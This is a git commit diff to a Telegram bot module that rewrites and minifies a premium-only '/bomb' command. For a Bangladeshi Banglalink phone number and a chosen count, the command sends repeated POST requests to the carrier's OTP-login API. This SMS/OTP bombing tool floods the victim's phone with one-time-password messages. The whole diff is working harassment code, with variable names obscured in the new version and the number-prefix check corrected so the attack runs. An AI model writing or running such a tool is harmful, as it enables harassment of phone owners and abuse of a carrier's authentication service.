e464c46172c7e323090e17b9b62e556f07dd576b
fxsihadds <137089580+fxsihadds@users.noreply.github.com>
2023-10-01 09:16:44 +0600

    Update number.py

--- users/number.py
+++ users/number.py
@@ -1,36 +1,20 @@
 import requests
-from pyrogram import Client, filters
-
-
+from pyrogram import Client,filters
 def register(app):
-    @app.on_message(filters.command("bomb"))
-    async def bomb(client, message):
-        with open(file="users/premium.txt", mode="r+", encoding='utf-8') as premium:
-            premium_users = premium.readlines()
-        if str(message.from_user.id) + '\n' in premium_users:
-            try:
-                _, number, amount = message.text.split()
-                number = number.strip()
-                amount = int(amount.strip())
-            except ValueError:
-                return await message.reply("<b>⎚ Use <code>/bomb </code>[number] [amount]</b>")
-            except Exception as e:
-                return await message.reply(f"<b>⎚ Error: {str(e)}</b>")
-
-            if len(number) == 11 and number.startswith("019", "014"):
-                status = await message.reply("<b>⎚ `Request Sending...`</b>")
-                for _ in range(amount):
-                    pera = {
-                        "mobile": number
-                    }
-                    try:
-                        req = requests.post(
-                            url="https://web-api.banglalink.net/api/v1/user/otp-login/request", json=pera).json()
-                    except Exception as e:
-                        print(f"Error sending request: {str(e)}")
-                await status.edit("<b>Finished</b>")
-            else:
-                await message.reply("<b>Please Use Banglalink Number Without +88</b>")
-
-        else:
-            return await message.reply(f'<b>Only For Premium Members</b>')
+	@app.on_message(filters.command('bomb'))
+	async def A(client,message):
+		A=message
+		with open(file='users/premium.txt',mode='r+',encoding='utf-8')as E:F=E.readlines()
+		if str(A.from_user.id)+'\n'in F:
+			try:G,B,C=A.text.split();B=B.strip();C=int(C.strip())
+			except ValueError:return await A.reply('<b>⎚ Use <code>/bomb </code>[number] [amount]</b>')
+			except Exception as D:return await A.reply(f"<b>⎚ Error: {str(D)}</b>")
+			if len(B)==11 and str(B).startswith(('019','014')):
+				H=await A.reply('<b>⎚ `Request Sending...`</b>')
+				for G in range(C):
+					I={'mobile':B}
+					try:J=requests.post(url='https://web-api.banglalink.net/api/v1/user/otp-login/request',json=I).json()
+					except Exception as D:print(f"Error sending request: {str(D)}")
+				await H.edit('<b>Finished</b>')
+			else:await A.reply('<b>Please Use Banglalink Number Without +880</b>')
+		else:return await A.reply(f"<b>Only For Premium Members</b>")
